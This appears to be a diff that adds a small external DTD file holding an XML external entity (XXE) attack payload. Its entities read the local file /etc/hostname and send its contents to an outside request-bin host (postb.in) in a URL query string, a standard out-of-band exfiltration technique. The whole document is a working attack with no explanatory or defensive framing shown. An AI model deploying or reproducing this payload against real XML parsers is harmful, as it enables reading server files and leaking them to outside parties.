@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://www.postb.in/1794301500811-0725624291226?d=%file;'>">
+%eval;
+%exfil;
